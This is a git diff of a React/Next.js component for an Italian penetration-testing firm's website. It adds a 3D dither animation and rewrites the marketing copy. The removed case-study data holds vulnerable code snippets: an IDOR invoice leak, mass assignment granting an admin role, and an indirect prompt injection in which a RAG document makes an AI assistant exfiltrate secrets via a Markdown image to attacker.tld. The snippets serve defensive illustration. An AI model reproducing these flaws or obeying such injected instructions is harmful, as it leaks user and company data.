@@ -1,6 +1,6 @@
 "use client";
 
-import React, { useCallback, useEffect, useMemo, useRef, useState } from "react";
+import React, { useCallback, useEffect, useRef, useState } from "react";
 import Link from "next/link";
 
 const PHONE_NUMBER = "tel:+393711500055";
@@ -49,6 +49,9 @@ export type DitherSceneKind =
   | "torus"
   | "star"
   | "hollowCube"
+  | "structureRetool"
+  | "structureAdapt"
+  | "structureEvolve"
   | "sunDome";
 
 interface PixelDitherCanvasProps {
@@ -339,6 +342,115 @@ function drawQuadZ3D(
         colorId,
         true
       );
+    }
+  }
+}
+
+function drawEvolvingStructure3D(
+  stage: 0 | 1 | 2,
+  buf: Float32Array,
+  zBuf: Float32Array,
+  cols: number,
+  rows: number,
+  t: number,
+  mx: number,
+  my: number,
+  baseScale: number,
+  cx: number,
+  cy: number
+) {
+  const rx = 0.5 + my * 0.35;
+  const ry = t * 0.54 + mx * 0.5;
+  const s = baseScale * 0.9;
+  const d = 0.72;
+  const thick = stage === 2 ? 0.13 : 0.11;
+
+  // Stessa architettura a 12 travi esterne + nucleo centrale + 6 moduli assiali vista in 3 stati progressivi
+  const beams: Array<{ c: Vec3; h: Vec3 }> = [
+    { c: [0, -d, -d], h: [d, thick, thick] },
+    { c: [0, d, -d], h: [d, thick, thick] },
+    { c: [0, -d, d], h: [d, thick, thick] },
+    { c: [0, d, d], h: [d, thick, thick] },
+    { c: [-d, 0, -d], h: [thick, d, thick] },
+    { c: [d, 0, -d], h: [thick, d, thick] },
+    { c: [-d, 0, d], h: [thick, d, thick] },
+    { c: [d, 0, d], h: [thick, d, thick] },
+    { c: [-d, -d, 0], h: [thick, thick, d] },
+    { c: [d, -d, 0], h: [thick, thick, d] },
+    { c: [-d, d, 0], h: [thick, thick, d] },
+    { c: [d, d, 0], h: [thick, thick, d] },
+  ];
+
+  const adaptPulse = 0.5 + 0.5 * Math.sin(t * 2.0);
+
+  for (let i = 0; i < beams.length; i++) {
+    const beam = beams[i];
+    if (stage === 0) {
+      // RETOOL: alcune travi mancano (lacune strutturali) e altre sono staccate e inclinate
+      if (i === 1 || i === 5 || i === 11) continue;
+      if (i === 0 || i === 6 || i === 9) {
+        const drift = 0.24 + 0.05 * Math.sin(t * 1.8 + i);
+        const dc: Vec3 = [
+          beam.c[0] + (beam.c[0] === 0 ? 0.16 : Math.sign(beam.c[0]) * drift),
+          beam.c[1] + (beam.c[1] === 0 ? -0.14 : Math.sign(beam.c[1]) * drift),
+          beam.c[2] + (beam.c[2] === 0 ? 0.12 : Math.sign(beam.c[2]) * drift),
+        ];
+        drawRotatedBox3D(buf, zBuf, cols, rows, dc, beam.h, 0.28 + i * 0.07, -0.24, rx, ry, s, cx, cy, 10, 0, undefined, 0, false);
+        continue;
+      }
+      drawFilledBox3D(buf, zBuf, cols, rows, beam.c, beam.h, rx, ry, s, cx, cy, 8);
+    } else if (stage === 1) {
+      // ADAPT: la cornice viene ricomposta con guide assiali verso la posizione finale
+      const isRealigning = i === 1 || i === 5 || i === 9;
+      const offset = isRealigning ? (1 - adaptPulse) * 0.24 : 0;
+      const cc: Vec3 = [
+        beam.c[0] + (offset > 0 ? Math.sign(beam.c[0] || 1) * offset : 0),
+        beam.c[1] + (offset > 0 ? Math.sign(beam.c[1] || -1) * offset : 0),
+        beam.c[2] + (offset > 0 ? Math.sign(beam.c[2] || 1) * offset : 0),
+      ];
+      if (offset > 0.03) {
+        drawLine3D(buf, zBuf, cols, rows, beam.c, cc, rx, ry, s, cx, cy, 0.72, 0);
+      }
+      drawFilledBox3D(buf, zBuf, cols, rows, cc, beam.h, rx, ry, s, cx, cy, 8);
+    } else {
+      // EVOLVE: tutte e 12 le travi della gabbia protettiva sono bloccate e coese
+      drawFilledBox3D(buf, zBuf, cols, rows, beam.c, beam.h, rx, ry, s, cx, cy, 8);
+    }
+  }
+
+  // Nucleo centrale della struttura
+  const coreHalf = stage === 0 ? 0.22 : stage === 1 ? 0.29 : 0.35;
+  drawFilledBox3D(buf, zBuf, cols, rows, [0, 0, 0], [coreHalf, coreHalf, coreHalf], rx, ry, s, cx, cy, 11);
+
+  // 6 moduli/piastre funzionali lungo gli assi: dispersi (0), in allineamento (1), agganciati al nucleo (2)
+  const plateAxes: Array<{ dir: Vec3; half: Vec3 }> = [
+    { dir: [0, 0, 1], half: [0.22, 0.22, 0.06] },
+    { dir: [0, 0, -1], half: [0.22, 0.22, 0.06] },
+    { dir: [1, 0, 0], half: [0.06, 0.22, 0.22] },
+    { dir: [-1, 0, 0], half: [0.06, 0.22, 0.22] },
+    { dir: [0, 1, 0], half: [0.22, 0.06, 0.22] },
+    { dir: [0, -1, 0], half: [0.22, 0.06, 0.22] },
+  ];
+
+  for (let i = 0; i < plateAxes.length; i++) {
+    const p = plateAxes[i];
+    if (stage === 0) {
+      const dist = 0.56 + 0.1 * Math.sin(t * 1.5 + i * 1.1);
+      const pos: Vec3 = [
+        p.dir[0] * dist + Math.sin(i * 2.1) * 0.1,
+        p.dir[1] * dist + Math.cos(i * 1.7) * 0.1,
+        p.dir[2] * dist,
+      ];
+      drawRotatedBox3D(buf, zBuf, cols, rows, pos, p.half, 0.34 + i * 0.14, 0.26 - i * 0.1, rx, ry, s, cx, cy, 11, 0, undefined, 0, false);
+    } else if (stage === 1) {
+      const slide = 0.35 + 0.22 * (0.5 + 0.5 * Math.sin(t * 2.2 + i * 0.9));
+      const pos: Vec3 = [p.dir[0] * slide, p.dir[1] * slide, p.dir[2] * slide];
+      drawLine3D(buf, zBuf, cols, rows, [0, 0, 0], pos, rx, ry, s, cx, cy, 0.65, 0);
+      drawFilledBox3D(buf, zBuf, cols, rows, pos, p.half, rx, ry, s, cx, cy, 10);
+    } else {
+      const lockedDist = 0.39 + Math.sin(t * 1.4) * 0.012;
+      const pos: Vec3 = [p.dir[0] * lockedDist, p.dir[1] * lockedDist, p.dir[2] * lockedDist];
+      drawFilledBox3D(buf, zBuf, cols, rows, pos, p.half, rx, ry, s, cx, cy, 10);
     }
   }
 }
@@ -1099,6 +1211,20 @@ function renderSceneToBuffer(
       drawFilledBox3D(buf, zBuf, cols, rows, c, h, rx, ry, s, cx, cy, 8);
     }
   }
+
+  if (kind === "structureRetool") {
+    drawEvolvingStructure3D(0, buf, zBuf, cols, rows, t, mx, my, baseScale, cx, cy);
+    return;
+  }
+
+  if (kind === "structureAdapt") {
+    drawEvolvingStructure3D(1, buf, zBuf, cols, rows, t, mx, my, baseScale, cx, cy);
+    return;
+  }
+
+  if (kind === "structureEvolve") {
+    drawEvolvingStructure3D(2, buf, zBuf, cols, rows, t, mx, my, baseScale, cx, cy);
+  }
 }
 
 export function PixelDitherCanvas({
@@ -1358,21 +1484,25 @@ function PixelDissolveBadge({
 
       // Se scrambleOnEnter è attivo, decodifica rapida a caratteri glitch prima di stabilizzarsi
       const glyphs = "01#$*&%<>[]_~!?";
+      const scrambleString = (locked: number) =>
+        text
+          .split("")
+          .map((c, i) => (i < locked ? c : glyphs[Math.floor(Math.random() * glyphs.length)]))
+          .join("");
       let scrambleTick = 0;
+      const totalScrambleTicks = 8;
       if (scrambleOnEnter) {
+        setDisplayText(scrambleString(0));
         scrambleInterval = setInterval(() => {
           scrambleTick++;
-          if (scrambleTick >= 6) {
+          if (scrambleTick >= totalScrambleTicks) {
             setDisplayText(text);
             clearInterval(scrambleInterval);
           } else {
-            const scrambled = text
-              .split("")
-              .map((c, i) => (i < Math.floor((scrambleTick / 6) * text.length) ? c : glyphs[Math.floor(Math.random() * glyphs.length)]))
-              .join("");
-            setDisplayText(scrambled);
+            const locked = Math.floor((scrambleTick / totalScrambleTicks) * text.length);
+            setDisplayText(scrambleString(locked));
           }
-        }, 40);
+        }, 42);
       } else {
         setDisplayText(text);
       }
@@ -1446,7 +1576,7 @@ function PixelDissolveBadge({
 }
 
 
-/** 1a. HeroEvolveTitle: "THE THREATS" + [EVOLVE] -> EVOLVE sale sopra THE THREATS -> a destra YOUR e sotto BUSINESS */
+/** 1a. HeroEvolveTitle: "THE DIGITAL WORLD HAS" + [EVOLVED.] -> prima il posto è vuoto, poi l'animazione porta a EVOLVED */
 function HeroEvolveTitle({
   replayKey,
   onReplay,
@@ -1454,76 +1584,32 @@ function HeroEvolveTitle({
   replayKey: number;
   onReplay: () => void;
 }) {
-  const [phase, setPhase] = useState<"empty" | "animating" | "settled" | "rising" | "your" | "business">("empty");
-  const [metrics, setMetrics] = useState({ riseY: 120, evolveW: 360 });
-  const containerRef = useRef<HTMLHeadingElement | null>(null);
-  const evolveRef = useRef<HTMLDivElement | null>(null);
-
-  useEffect(() => {
-    const measure = () => {
-      if (!evolveRef.current) return;
-      setMetrics({
-        riseY: evolveRef.current.offsetTop,
-        evolveW: evolveRef.current.offsetWidth,
-      });
-    };
-    measure();
-    window.addEventListener("resize", measure);
-    return () => window.removeEventListener("resize", measure);
-  }, [replayKey]);
+  const [phase, setPhase] = useState<"empty" | "visible">("empty");
 
   useEffect(() => {
     let active = true;
 
-    // Passaggio 1: all'inizio il posto è completamente vuoto
+    // Passaggio 1: all'inizio il posto di EVOLVED è completamente vuoto
     const t0 = setTimeout(() => {
       if (active) setPhase("empty");
     }, 0);
 
-    // Passaggio 2: dopo tot secondi (~1.3s) parte l'animazione dither + scramble che porta a EVOLVE
+    // Passaggio 2: dopo ~1.3s parte l'animazione dither + decodifica che porta a EVOLVED (e lì resta)
     const t1 = setTimeout(() => {
-      if (active) setPhase("animating");
+      if (active) setPhase("visible");
     }, 1300);
-
-    // Passaggio 3: EVOLVE è consolidato e resta visibile chiaramente in loco per ~1.2s
-    const t2 = setTimeout(() => {
-      if (active) setPhase("settled");
-    }, 1800);
-
-    // Passaggio 4: EVOLVE sale sopra THE THREATS
-    const t3 = setTimeout(() => {
-      if (active) setPhase("rising");
-    }, 3000);
-
-    // Passaggio 5: compare YOUR a destra
-    const t4 = setTimeout(() => {
-      if (active) setPhase("your");
-    }, 3650);
-
-    // Passaggio 6: compare BUSINESS sotto YOUR
-    const t5 = setTimeout(() => {
-      if (active) setPhase("business");
-    }, 4000);
 
     return () => {
       active = false;
       clearTimeout(t0);
       clearTimeout(t1);
-      clearTimeout(t2);
-      clearTimeout(t3);
-      clearTimeout(t4);
-      clearTimeout(t5);
     };
   }, [replayKey]);
 
   const isEmpty = phase === "empty";
-  const isRising = phase === "rising" || phase === "your" || phase === "business";
-  const showYour = phase === "your" || phase === "business";
-  const showBusiness = phase === "business";
 
   return (
     <h1
-      ref={containerRef}
       onClick={onReplay}
       style={{
         position: "relative",
@@ -1531,96 +1617,46 @@ function HeroEvolveTitle({
         display: "flex",
         flexDirection: "column",
         alignItems: "flex-start",
-        gap: "0.18em",
+        gap: "0.12em",
         textTransform: "uppercase",
         cursor: "pointer",
         width: "100%",
       }}
     >
-      {/* Riga 1: THE THREATS (svanisce quando EVOLVE sale a coprirla) */}
+      {/* Riga 1: THE DIGITAL WORLD HAS */}
       <span
         style={{
           fontFamily: DISPLAY_FONT,
           fontWeight: 700,
-          fontSize: "clamp(2.8rem, 7.8vw, 7.4rem)",
+          fontSize: "clamp(2.4rem, 6.6vw, 6.4rem)",
           lineHeight: 0.94,
           letterSpacing: "-0.02em",
           color: PALETTE.ink,
-          opacity: isRising ? 0 : 1,
-          transform: isRising ? "translateY(-14px)" : "translateY(0)",
-          transition: "opacity 340ms ease, transform 420ms ease",
           pointerEvents: "none",
         }}
       >
-        THE THREATS
+        THE DIGITAL WORLD HAS
       </span>
 
-      {/* Riga 2: EVOLVE (passaggi: prima vuoto, poi animazione che porta a EVOLVE, poi consolidamento e ascesa) */}
+      {/* Riga 2: EVOLVED. (prima vuoto, poi animazione che porta alla parola) */}
       <div
-        ref={evolveRef}
         style={{
           position: "relative",
           zIndex: 2,
           opacity: isEmpty ? 0 : 1,
           pointerEvents: isEmpty ? "none" : "auto",
-          transform: isRising ? `translateY(-${metrics.riseY}px)` : "translateY(0)",
-          transition: "transform 620ms cubic-bezier(0.22, 1, 0.36, 1), opacity 260ms ease",
+          transition: "opacity 110ms ease",
         }}
       >
         <PixelDissolveBadge
-          text="EVOLVE"
-          triggerKey={phase === "empty" ? undefined : `${replayKey}-${phase}`}
-          scrambleOnEnter={phase === "animating"}
+          text="EVOLVED."
+          triggerKey={isEmpty ? `${replayKey}-hidden` : `${replayKey}-shown`}
+          scrambleOnEnter={!isEmpty}
           bg={PALETTE.blue}
-          fg={PALETTE.ink}
-          fontSize="clamp(3.3rem, 9.5vw, 9.2rem)"
+          fg="#F4F3FA"
+          fontSize="clamp(3rem, 8.6vw, 8.2rem)"
           padding="0.08em 0.28em"
         />
-      </div>
-
-      {/* A destra di EVOLVE compare YOUR e sotto BUSINESS */}
-      <div
-        style={{
-          position: "absolute",
-          top: 0,
-          left: `${metrics.evolveW + 24}px`,
-          display: "flex",
-          flexDirection: "column",
-          alignItems: "flex-start",
-          gap: "0.14em",
-          pointerEvents: "none",
-        }}
-      >
-        <span
-          style={{
-            fontFamily: DISPLAY_FONT,
-            fontWeight: 700,
-            fontSize: "clamp(2.8rem, 7.8vw, 7.4rem)",
-            lineHeight: 0.94,
-            letterSpacing: "-0.02em",
-            color: PALETTE.ink,
-            opacity: showYour ? 1 : 0,
-            transform: showYour ? "translateY(0)" : "translateY(18px)",
-            transition: "opacity 360ms ease, transform 420ms cubic-bezier(0.22, 1, 0.36, 1)",
-          }}
-        >
-          YOUR
-        </span>
-        <span
-          style={{
-            fontFamily: DISPLAY_FONT,
-            fontWeight: 700,
-            fontSize: "clamp(2.8rem, 7.8vw, 7.4rem)",
-            lineHeight: 0.94,
-            letterSpacing: "-0.02em",
-            color: PALETTE.ink,
-            opacity: showBusiness ? 1 : 0,
-            transform: showBusiness ? "translateY(0)" : "translateY(18px)",
-            transition: "opacity 380ms ease, transform 440ms cubic-bezier(0.22, 1, 0.36, 1)",
-          }}
-        >
-          BUSINESS
-        </span>
       </div>
     </h1>
   );
@@ -1692,53 +1728,8 @@ function TypewriterBar({
 }
 
 
-/** 3. ScrambleMono: decodifica testo monospace stile "Challenge your assumptions" (1:14) */
-function ScrambleMono({
-  text,
-  triggerKey,
-  style,
-}: {
-  text: string;
-  triggerKey?: string | number;
-  style?: React.CSSProperties;
-}) {
-  const [output, setOutput] = useState(text);
-
-  useEffect(() => {
-    const glyphs = "_/=#01.";
-    let frame = 0;
-    const totalFrames = 14;
-    const timer = setInterval(() => {
-      frame++;
-      const lockedCount = Math.floor((frame / totalFrames) * text.length);
-      let next = "";
-      for (let i = 0; i < text.length; i++) {
-        if (text[i] === " " || i < lockedCount) {
-          next += text[i];
-        } else {
-          next += glyphs[(i * 7 + frame * 3) % glyphs.length];
-        }
-      }
-      setOutput(next);
-      if (frame >= totalFrames) {
-        clearInterval(timer);
-        setOutput(text);
-      }
-    }, 32);
-
-    return () => clearInterval(timer);
-  }, [text, triggerKey]);
-
-  return (
-    <span style={{ fontFamily: MONO_FONT, ...style }}>
-      {output}
-    </span>
-  );
-}
-
-
 /* ============================================================================
- * DATI STRATEGICI CYBERSEC PER I 4 TARGET (Imprenditori, PMI, Startup, Multi)
+ * DATI STRATEGICI CYBERSEC PER I TARGET (Imprenditori e PMI, Startup, Multi)
  * ========================================================================== */
 type BuyerSegmentKey = "pmi" | "startup" | "enterprise";
 
@@ -1746,56 +1737,60 @@ const BUYER_SEGMENTS: Record<
   BuyerSegmentKey,
   {
     code: string;
-    badgeWord: string;
     badgeColor: string;
     label: string;
     headline: string;
-    pain: string;
-    trigger: string;
-    vector: string;
-    deliverable: string;
-    sla: string;
-    pillars: string[];
+    intro: string[];
+    statement: string;
+    approach: string;
+    cta: string;
   }
 > = {
   pmi: {
-    code: "01 // IMPRENDITORI & PMI",
-    badgeWord: "CONTINUITY",
+    code: "01",
     badgeColor: PALETTE.red,
-    label: "Protezione Patrimonio & Continuità Aziendale",
-    headline: "Evitare il fermo azienda prima che accada il riscatto.",
-    pain: "Un ransomware o una frode sui bonifici (BEC) blocca produzione, fatturazione e reputazione in 20 minuti. I fornitori IT generici installano antivirus ma non testano mai le vere vie d'ingresso.",
-    trigger: "Vedere con chiarezza da dove entra un attaccante nella propria rete/gestionale e chiudere i varchi senza burocrazia né rallentare i dipendenti.",
-    vector: "Esposizione VPN/RDP senza MFA rigida, portali fornitori con sessioni deboli, backup raggiungibili dalla rete interna.",
-    deliverable: "Verifica perimetrale completa + Piano d'azione chiaro in italiano per la direzione + Affiancamento diretto al team IT per la messa in sicurezza.",
-    sla: "Report esecutivo in 5 giorni lavorativi · Conformità GDPR / NIS2",
-    pillars: ["Perimetro", "Backup Zero-Trust", "Identità & Accessi", "Continuità"],
+    label: "Imprenditori e PMI",
+    headline: "Se domani il tuo gestionale si fermasse, cosa succederebbe?",
+    intro: [
+      "Quante attività della tua giornata dipendono da un software, da un account o da un fornitore informatico?",
+      "Spesso ci rendiamo conto di quanto siano importanti soltanto quando qualcosa smette di funzionare.",
+    ],
+    statement:
+      "Non devi diventare un esperto di cybersecurity. Devi poter capire quali rischi riguardano la tua attività e quali decisioni è importante prendere.",
+    approach:
+      "Attraverso verifiche mirate possiamo individuare le criticità di sistemi e accessi, distinguere ciò che è urgente da ciò che può aspettare e costruire una base concreta per gli interventi successivi.",
+    cta: "Parliamo della tua attività",
   },
   startup: {
-    code: "02 // STARTUP & SAAS / AI",
-    badgeWord: "VELOCITY",
+    code: "02",
     badgeColor: PALETTE.blue,
-    label: "Sblocca Deal Enterprise & Due Diligence Investitori",
-    headline: "Passa il security audit del cliente B2B in giorni, non in mesi.",
-    pain: "Il prodotto funziona ma un questionario di sicurezza Enterprise o una falla sulle API/LLM rischia di far saltare il contratto più grande dell'anno.",
-    trigger: "Niente PDF da 200 pagine generati da tool automatici: vogliono test chirurgici sulla logica delle API e il codice della patch pronto per il merge nella Pull Request.",
-    vector: "BOLA/IDOR multi-tenant sulle API, JWT malleabili, Indirect Prompt Injection su agenti AI/RAG con esfiltrazione contesto.",
-    deliverable: "Proof-of-Concept riproducibili step-by-step + Diff di codice pronti per Next.js/Node/Python + Attestato tecnico per investitori e clienti Enterprise.",
-    sla: "Audit completo & Re-Test in 7 giorni · Patch pronte su GitHub",
-    pillars: ["API & Auth Logic", "Multi-Tenancy", "AI & LLM Guardrails", "CI/CD Gates"],
+    label: "Startup e software house",
+    headline: "Il tuo prodotto funziona. Ma hai verificato cosa succede quando qualcuno prova ad abusarne?",
+    intro: [
+      "Hai investito tempo per svilupparlo, lanciarlo e portarlo sul mercato.",
+      "Ogni nuova funzionalità, integrazione o sistema di accesso introduce però comportamenti che devono essere verificati.",
+      "Una vulnerabilità può mettere a rischio i dati degli utenti, creare interruzioni o compromettere la fiducia di clienti e partner.",
+    ],
+    statement:
+      "Non significa rallentare l'innovazione. Significa evitare che un problema trascurato comprometta il lavoro già fatto.",
+    approach:
+      "Con test mirati possiamo verificare le parti più sensibili del prodotto e fornire evidenze e indicazioni tecniche utilizzabili dal team di sviluppo.",
+    cta: "Parliamo del tuo software",
   },
   enterprise: {
-    code: "03 // MULTINAZIONALI & CORPORATE",
-    badgeWord: "DEPTH",
+    code: "03",
     badgeColor: PALETTE.ink,
-    label: "Offensive Security Manuale dove gli Scanner Sono Ciechi",
-    headline: "Trovare le catene d'exploit che superano WAF, SOC e SAST.",
-    pain: "Scanner automatici e audit formali generano migliaia di falsi positivi ma mancano le vulnerabilità di logica di business, privilege escalation orizzontale e lateral movement cloud.",
-    trigger: "Un ingaggio chirurgico sotto NDA rigoroso che simula un avversario umano persistente su asset critici, parlando sia al CISO/Board sia al team DevSecOps.",
-    vector: "Concatenazione di race condition su flussi finanziari, SSRF verso metadata cloud IAM, bypass di RBAC tra microservizi distribuiti.",
-    deliverable: "Dossier doppio (Executive Risk Matrix per il Board + PoC & Remediation Guide per Ingegneria) + Sessione dedicata di Re-Test certificato.",
-    sla: "Scoping sotto NDA in 24h · Re-Test incluso a zero attriti",
-    pillars: ["Business Logic", "Cloud IAM & K8s", "Code Review", "Red Teaming"],
+    label: "Multinazionali e grandi organizzazioni",
+    headline: "Avere molti controlli non significa aver verificato ogni punto critico.",
+    intro: [
+      "Applicazioni, sedi, fornitori e team condividono dati e sistemi.",
+      "In un'organizzazione complessa, alcune debolezze possono emergere proprio nelle interazioni tra componenti che, considerate singolarmente, sembrano funzionare correttamente.",
+    ],
+    statement:
+      "Il valore di una verifica mirata non è sostituire ciò che già esiste. È approfondire ciò che potrebbe non essere ancora stato osservato.",
+    approach:
+      "L'obiettivo è fornire evidenze tecniche su sistemi e percorsi specifici, aiutando i team responsabili a comprendere meglio i rischi individuati.",
+    cta: "Confrontiamoci su un sistema",
   },
 };
 
@@ -1804,61 +1799,40 @@ const RE_PILLARS: Array<{
   verb: string;
   color: string;
   scene: DitherSceneKind;
-  concept: string;
-  desc: string;
+  title: string;
+  body: string[];
 }> = [
   {
     prefix: "DE",
     verb: "CONSTRUCT",
     color: PALETTE.red,
     scene: "cube",
-    concept: "first principles // attack surface",
-    desc: "Smontiamo architettura, ruoli, endpoint e pipeline CI/CD partendo dai fondamentali, prima ancora di lanciare un singolo pacchetto.",
+    title: "Prima capiamo come funziona.",
+    body: [
+      "Ogni azienda utilizza tecnologie diverse. Partiamo dai sistemi, dagli accessi e dalle applicazioni che sostengono il suo lavoro, per capire dove concentrare le verifiche.",
+    ],
   },
   {
     prefix: "EX",
     verb: "PLOIT",
     color: "#8B46FF",
     scene: "exploitCube",
-    concept: "business logic // zero false positives",
-    desc: "Test d'intrusione 100% manuali dentro il labirinto dei permessi e delle API: ogni falla viene dimostrata con un Proof-of-Concept reale.",
+    title: "Poi mettiamo alla prova la sicurezza.",
+    body: [
+      "Con test autorizzati e mirati, verifichiamo se determinate debolezze possano essere realmente sfruttate.",
+      "Perché conoscere una vulnerabilità è diverso dal capire quali conseguenze potrebbe avere.",
+    ],
   },
   {
     prefix: "RE",
     verb: "MEDIATE",
     color: PALETTE.ink,
     scene: "cluster",
-    concept: "what's possible // patched & verified",
-    desc: "Scriviamo insieme al tuo team la correzione esatta nel codice sorgente e rieseguiamo il test finale per certificare la chiusura totale.",
-  },
-];
-
-const EVOLUTION_STAGES: Array<{
-  id: string;
-  label: string;
-  sequence: string[];
-  subheadline: string;
-}> = [
-  {
-    id: "static-perimeter",
-    label: "01 // STATIC PERIMETER",
-    sequence: ["MANUAL", "FIREWALLED", "STATIC", "EVOLVED"],
-    subheadline:
-      "Ieri bastava chiudere le porte di rete con un firewall. Oggi le minacce hanno superato il perimetro statico e si sono evolute.",
-  },
-  {
-    id: "distributed-surface",
-    label: "02 // DISTRIBUTED SURFACE",
-    sequence: ["CLOUD", "API-DRIVEN", "DISTRIBUTED", "EVOLVED"],
-    subheadline:
-      "Il tuo prodotto vive tra API, microservizi e identità cloud: la superficie d'attacco è ovunque e le minacce si sono evolute con essa.",
-  },
-  {
-    id: "autonomous-risk",
-    label: "03 // AUTONOMOUS RISK",
-    sequence: ["STATIC", "SCRIPTED", "DISTRIBUTED", "AUTONOMOUS", "EVOLVED"],
-    subheadline:
-      "Il tuo software evolve ogni settimana. Le minacce non colpiscono più solo l'infrastruttura: sfruttano logiche applicative, API, cloud identity e agenti AI.",
+    title: "Infine, capiamo cosa correggere.",
+    body: [
+      "Le verifiche devono produrre risposte, non soltanto elenchi di problemi.",
+      "Le criticità individuate vengono spiegate, documentate e tradotte in indicazioni operative, così da poter decidere dove intervenire e con quale priorità.",
+    ],
   },
 ];
 
@@ -1869,37 +1843,42 @@ const DIFF_BANDS: Array<{
   badgeBg: string;
   badgeFg: string;
   scene: DitherSceneKind;
-  caseTag: string;
+  step: string;
   title: string;
-  summary: string;
-  vulnerableCode: string;
-  patchedCode: string;
+  body: string[];
+  statement: string;
 }> = [
   {
     word: "RETOOL",
     bg: PALETTE.blue,
-    fg: PALETTE.bg,
+    fg: "#F4F3FA",
     badgeBg: PALETTE.bg,
     badgeFg: PALETTE.ink,
-    scene: "torus",
-    caseTag: "CASO 01 // FINTECH API PENETRATION TEST",
-    title: "BOLA / IDOR su endpoint di fatturazione multi-tenant.",
-    summary: "Lo scanner automatico dava esito 100% pulito perché il token JWT era valido. Modificando l'ID risorsa, qualsiasi utente scaricava le fatture di altri clienti.",
-    vulnerableCode: `// VULNERABILE: controlla solo il login, non la proprietà\nGET /api/v2/invoices/:invoiceId\nconst invoice = await db.invoices.findUnique({ where: { id } });\nreturn Response.json(invoice); // ❌ Leak cross-tenant`,
-    patchedCode: `// PATCHED: ownership enforcement atomico nella query\nGET /api/v2/invoices/:invoiceId\nconst invoice = await db.invoices.findFirst({\n  where: { id, organizationId: session.orgId }\n}); // ✓ Nessun bypass orizzontale possibile`,
+    scene: "structureRetool",
+    step: "01 // RETOOL",
+    title: "Rimetti in discussione i tuoi strumenti.",
+    body: [
+      "Quello che funzionava cinque anni fa potrebbe non essere più sufficiente oggi.",
+      "Un sistema datato, un software non supportato o una tecnologia mai aggiornata possono diventare un punto debole.",
+    ],
+    statement:
+      "Aggiornare non significa necessariamente sostituire tutto. Significa capire cosa mantenere, cosa migliorare e cosa non puoi più trascurare.",
   },
   {
     word: "ADAPT",
     bg: PALETTE.red,
-    fg: PALETTE.bg,
+    fg: "#F4F3FA",
     badgeBg: PALETTE.bg,
     badgeFg: PALETTE.ink,
-    scene: "star",
-    caseTag: "CASO 02 // DEVSECOPS DIFF SECURITY GATE",
-    title: "Privilegi admin sbloccati da parametri extra nel payload JSON.",
-    summary: "Una singola riga in un endpoint di aggiornamento profilo accettava un campo `role` non filtrato (Mass Assignment). Aggiunto gate automatico prima di ogni merge.",
-    vulnerableCode: `// VULNERABILE: spread diretto del body utente\nawait db.user.update({\n  where: { id: session.userId },\n  data: { ...await req.json() }\n}); // ❌ {"role": "ADMIN"} accettato`,
-    patchedCode: `// PATCHED: allowlist esplicita + schema Zod rigoroso\nconst { fullName, locale } = ProfileSchema.parse(body);\nawait db.user.update({\n  where: { id: session.userId },\n  data: { fullName, locale }\n}); // ✓ Superficie sigillata in CI`,
+    scene: "structureAdapt",
+    step: "02 // ADAPT",
+    title: "Cambia il modo in cui affronti i rischi.",
+    body: [
+      "Non basta installare una nuova tecnologia se continui a utilizzarla con le stesse abitudini.",
+      "Accessi concessi senza controllo, aggiornamenti rimandati e responsabilità poco chiare possono compromettere anche sistemi moderni.",
+    ],
+    statement:
+      "La sicurezza dipende dalle tecnologie, ma anche dalle decisioni e dai comportamenti di chi le utilizza.",
   },
   {
     word: "EVOLVE",
@@ -1907,12 +1886,15 @@ const DIFF_BANDS: Array<{
     fg: PALETTE.bg,
     badgeBg: PALETTE.bg,
     badgeFg: PALETTE.ink,
-    scene: "hollowCube",
-    caseTag: "CASO 03 // AI & LLM SECURITY HARDENING",
-    title: "Indirect Prompt Injection via documenti RAG aziendali.",
-    summary: "Un documento caricato nel sistema conteneva istruzioni nascoste che inducevano l'assistente AI a esfiltrare segreti interni tramite link Markdown.",
-    vulnerableCode: `// VULNERABILE: contesto non isolato né sanificato\nconst prompt = SYSTEM_INSTRUCTIONS + "\\nDoc:\\n" + pdfText;\nreturn renderMarkdown(await llm.generate(prompt));\n// ❌ ![x](https://attacker.tld?leak=SECRET)`,
-    patchedCode: `// PATCHED: separazione trust boundary + egress sanitizer\nconst answer = await llm.generate({ system, untrustedData: pdfText });\nreturn renderSafeText(stripExternalImageBeacons(answer));\n// ✓ Esfiltrazione bloccata a livello strutturale`,
+    scene: "structureEvolve",
+    step: "03 // EVOLVE",
+    title: "Non aspettare che sia un problema a farti cambiare.",
+    body: [
+      "Le minacce evolvono. Le tecnologie cambiano. Gli obblighi normativi possono cambiare.",
+      "Per questo la sicurezza non dovrebbe essere una questione affrontata una volta sola e poi dimenticata.",
+    ],
+    statement:
+      "Evolvere significa imparare a riconoscere quando è il momento di verificare, aggiornare e migliorare ciò su cui si basa la tua attività.",
   },
 ];
 
@@ -2043,19 +2025,12 @@ export function ScannerVsManualComparison() {
  * COMPONENTE PRINCIPALE: SITO CYBERSEC IN STILE LARACON AU 26
  * ========================================================================== */
 export function LaraconCybersecSite() {
-  const [stageIdx, setStageIdx] = useState<0 | 1 | 2>(2);
   const [replayNonce, setReplayNonce] = useState(0);
-  const [pointerOffset, setPointerOffset] = useState({ x: 0, y: 0 });
   const [cubeExploded, setCubeExploded] = useState(false);
   const [exploitActive, setExploitActive] = useState(false);
   const pillar0Ref = useRef<HTMLDivElement | null>(null);
   const pillar1Ref = useRef<HTMLDivElement | null>(null);
-  const [activeBuyer, setActiveBuyer] = useState<BuyerSegmentKey>("startup");
-  const [diffStates, setDiffStates] = useState<Record<number, "vuln" | "patch">>({
-    0: "patch",
-    1: "patch",
-    2: "patch",
-  });
+  const [activeBuyer, setActiveBuyer] = useState<BuyerSegmentKey>("pmi");
 
   useEffect(() => {
     const checkScrollCards = () => {
@@ -2092,28 +2067,7 @@ export function LaraconCybersecSite() {
     };
   }, []);
 
-  const activeStage = EVOLUTION_STAGES[stageIdx];
   const buyer = BUYER_SEGMENTS[activeBuyer];
-
-  const handleHeroPointerMove = useCallback((e: React.PointerEvent<HTMLElement>) => {
-    const r = e.currentTarget.getBoundingClientRect();
-    const nx = ((e.clientX - r.left) / r.width - 0.5) * 2;
-    const ny = ((e.clientY - r.top) / r.height - 0.5) * 2;
-    setPointerOffset({ x: nx, y: ny });
-  }, []);
-
-  const handleHeroPointerLeave = useCallback(() => {
-    setPointerOffset({ x: 0, y: 0 });
-  }, []);
-
-  const eraSubScenes = useMemo(
-    () => [
-      { id: "skyline" as const, label: "01 // SUPERFICIE D'ATTACCO ESPANSA [CHANGED]", color: PALETTE.red },
-      { id: "wave" as const, label: "02 // ONDATA DI ATTACCHI AUTOMATICI", color: PALETTE.blue },
